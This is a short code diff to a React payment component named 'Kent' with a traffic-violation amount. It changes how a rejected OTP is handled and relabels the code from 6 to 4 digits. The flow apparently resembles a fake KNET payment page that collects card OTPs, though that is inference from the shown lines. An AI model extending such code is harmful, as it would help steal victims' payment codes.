@@ -412,7 +412,8 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
               // If we're on step 3 and status is rejected, show alert
               setLoading(false)
               alert("تم رفض الرمز,الرجاء ادخال الرمز بشكل صحيح ")
-              setStep(2)
+              setPaymentInfo((prev)=>({...prev,otp:""}))
+            
             }
           }
         }
@@ -793,7 +794,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                 >
                   <div className="flex items-center justify-between mb-2">
                     <div className="flex items-center gap-1 text-blue-600">
-                      <strong>الرمز المرسل إلى الجوال من 6 أرقام</strong>
+                      <strong>الرمز المرسل إلى الجوال من 4 أرقام</strong>
                     </div>
                   </div>
                   <input
